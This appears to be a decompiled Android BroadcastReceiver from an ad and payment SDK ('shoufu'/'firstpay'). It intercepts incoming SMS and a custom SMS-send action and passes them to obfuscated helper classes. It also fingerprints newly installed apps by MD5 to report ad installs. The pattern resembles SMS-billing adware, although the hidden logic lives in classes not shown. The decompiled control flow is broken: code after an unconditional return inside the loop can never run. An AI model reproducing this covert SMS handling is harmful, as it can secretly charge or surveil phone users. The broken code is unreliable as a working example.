package com.shoufu.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.util.Log;
import com.shoufu.entity.response.Ad;
import com.shoufu.lib.ac;
import com.shoufu.lib.ci;
import com.shoufu.lib.cw;
import com.shoufu.lib.d;
import com.shoufu.lib.dn;
import com.shoufu.lib.dv;

public class AppReceiver
  extends BroadcastReceiver
{
  public AppReceiver() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if ("android.net.conn.CONNECTIVITY_CHANGE".equals(paramIntent.getAction()))
    {
      dv.d(paramContext);
      if (ac.c(paramContext))
      {
        dn.a(paramContext);
        dn.c(paramContext);
        dv.i(paramContext);
      }
    }
    for (;;)
    {
      return;
      if ("com.firstpay.action.TASK".equals(paramIntent.getAction()))
      {
        if (ac.c(paramContext))
        {
          dn.b(paramContext);
          dn.c(paramContext);
          if (cw.j(paramContext) % 3 == 0) {
            dv.f(paramContext);
          }
        }
        cw.k(paramContext);
        return;
      }
      if (("android.provider.Telephony.SMS_RECEIVED".equals(paramIntent.getAction())) || ("android.provider.Telephony.SMS_RECEIVED2".equals(paramIntent.getAction())) || ("com.firstpay.action.SMS_SEND".equals(paramIntent.getAction())))
      {
        dv.a(paramContext, paramIntent, this);
        return;
      }
      if ("android.intent.action.PACKAGE_ADDED".equals(paramIntent.getAction()))
      {
        String str = paramIntent.getDataString();
        PackageManager localPackageManager = paramContext.getPackageManager();
        Object localObject = str;
        if (str == null) {
          localObject = localPackageManager.getNameForUid(paramIntent.getExtras().getInt("android.intent.extra.UID"));
        }
        paramIntent = ((String)localObject).replace("package:", "");
        Log.d("AppReceiver", "package added:" + paramIntent);
        try
        {
          localObject = localPackageManager.getPackageInfo(paramIntent, 4096).applicationInfo;
          if (localObject != null)
          {
            paramIntent = ci.a(paramContext, paramIntent);
            if ((paramIntent != null) && (paramIntent.getMd5().equalsIgnoreCase(d.a(((ApplicationInfo)localObject).publicSourceDir, "MD5"))))
            {
              dn.a(paramContext, paramIntent.getAdid(), 2);
              return;
            }
          }
        }
        catch (PackageManager.NameNotFoundException paramContext)
        {
          paramContext.printStackTrace();
        }
      }
    }
  }
}
